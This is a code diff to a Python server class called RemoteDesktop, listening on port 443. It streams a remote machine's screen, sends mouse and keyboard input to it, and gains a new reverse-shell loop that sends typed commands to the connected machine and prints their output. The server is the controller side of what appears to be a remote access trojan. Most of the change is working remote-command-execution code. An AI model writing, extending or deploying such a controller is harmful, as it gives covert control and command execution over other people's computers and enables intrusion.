@@ -26,6 +26,7 @@ class RemoteDesktop:
         self.port = port
         self.active = False
         self.reset = False
+        self.revshell = True
         self.__block = threading.Lock()
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.bind((self.ip, self.port))
@@ -33,12 +34,9 @@ class RemoteDesktop:
         self.monitor = 0
         self.width = 0
         self.height = 0
+        self.cwd = "> "
         self.display_data = {}
-        self.position = 0
-        
-        #self.fernet = Fernet(key)
-        
-        
+        self.position = 0    
 
     def start_server(self):
         if self.active:
@@ -47,8 +45,7 @@ class RemoteDesktop:
             self.active = True
             server_thread = threading.Thread(target=self.__server_listening)
             server_thread.start()
-            
-            
+  
 
     def __server_listening(self):
         self.socket.listen()
@@ -74,7 +71,7 @@ class RemoteDesktop:
             
             
             
-    def send_msg(self, msg, conn):
+    def send(self, msg, conn):
         conn.send(msg)
         
         
@@ -87,7 +84,7 @@ class RemoteDesktop:
         for i in range(self.monitor - 1):
             self.position += self.display_data[i]['resolution'][0]
         return self.position
-
+    
 
     def showcords(self, event,x,y,flags,param) -> None:
         conn = param
@@ -95,16 +92,18 @@ class RemoteDesktop:
             self.userinput=1
         elif self.is_between(x, self.width-30, self.width-80) and self.is_between(y, 0, 50) and event == 4 and self.userinput==1:
             self.userinput=0
+
         if self.userinput == 1:
             if _win32:
                 win32api.SetCursor(win32api.LoadCursor(0, 32649))
             x = str(x + self.get_pos())
             y = str(y + int(self.display_data[self.monitor - 1]['position'][1]))
+            #print(x + self.get_pos() + int(self.display_data[self.monitor - 1]['position'][0]))
             event = str(event)
             flags = str(flags)
             data = ["mouse", x, y, event, flags]
             keys = ":".join(data)
-            self.send_msg(keys.encode('utf-8'), conn)
+            self.send(keys.encode('utf-8'), conn)
             self.position = 0
 
     def sortframe(self, frame_data):
@@ -125,8 +124,30 @@ class RemoteDesktop:
         else:
             return (fps, (0, 255, 0))
 
+        
+
+    def shell(self, connection):
+        while True:
+            if self.revshell:
+                try:
+                    shell = input(self.cwd)
+                    if shell == "cls" or shell == "clear":
+                        os.system("cls")
+                    elif shell == "":
+                        continue
+                    else:
+                        shell = "shell:" + shell
+                        self.send(shell.encode('utf-8'), connection)
+                        self.revshell = False
+                except EOFError:
+                    print()
+                    continue
+            else:
+                pass
     '''Sorry for the messy function'''
     def __client_connection(self, connection, address):
+        shell_thread = threading.Thread(target=self.shell, args=(connection,))
+        shell_thread.start()
         try:
             display = connection.recv(1028).decode()
             self.display_data = json.loads(display)
@@ -160,26 +181,30 @@ class RemoteDesktop:
                 data += connection.recv(4096)
             frame_data = data[:msg_size]
             data = data[msg_size:]
-            frame = self.sortframe(frame_data)
-            cv2.rectangle(frame, (self.width-30, 0), (self.width-80, 50), (136, 8, 8), 4)
-            if self.userinput == 0:
-                cv2.putText(frame, "Click blue box to control", (200,40), cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 0,0), 2)
-            cv2.setMouseCallback(str(address), self.showcords, param=(connection))
-            fps = self.fps(str(int(1 / (time.time()-loop_time))))
-            cv2.putText(frame, fps[0], (5, 30), cv2.FONT_HERSHEY_COMPLEX, 1, fps[1], 2)
-            cv2.imshow(str(address), frame)
-            k = cv2.waitKey(1)
-            quality = cv2.getTrackbarPos("Quality", str(address))
-            self.monitor = cv2.getTrackbarPos("Monitor", str(address)) + 1
-            quality = "config:" + str(quality) + ":" + str(self.userinput) + ":" + str(self.monitor)
-            if k != -1 and self.userinput == 1:
-                keyboard = "keyboard:" + str(k)
-                self.send_msg(keyboard.encode('utf-8'), connection)
-            if send >= 5:
-                self.send_msg(str(quality).encode('utf-8'), connection)
-                send = 0
+            if frame_data[0:7].decode() == "video->":
+                frame = self.sortframe(frame_data[7:])
+                cv2.rectangle(frame, (self.width-30, 0), (self.width-80, 50), (136, 8, 8), 4)
+                if self.userinput == 0:
+                    cv2.putText(frame, "Click blue box to control", (200,40), cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 0,0), 2)
+                cv2.setMouseCallback(str(address), self.showcords, param=(connection))
+                cv2.imshow(str(address), frame)
+                k = cv2.waitKey(1)
+                quality = cv2.getTrackbarPos("Quality", str(address))
+                self.monitor = cv2.getTrackbarPos("Monitor", str(address)) + 1
+                quality = "config:" + str(quality) + ":" + str(self.userinput) + ":" + str(self.monitor)
+                if k != -1 and self.userinput == 1:
+                    keyboard = "keyboard:" + str(k)
+                    self.send(keyboard.encode('utf-8'), connection)
+                if send >= 5:
+                    self.send(str(quality).encode('utf-8'), connection)
+                    send = 0
+            else:
+                self.cwd = frame_data.decode().strip().split(">", 1)[0] + "> "
+                print(frame_data.decode().split(">", 1)[1])
+                self.revshell = True
             send +=1
 
 if __name__ == '__main__':
     server = RemoteDesktop('0.0.0.0', 443)
     server.start_server()
+    print("Server listening...\n")
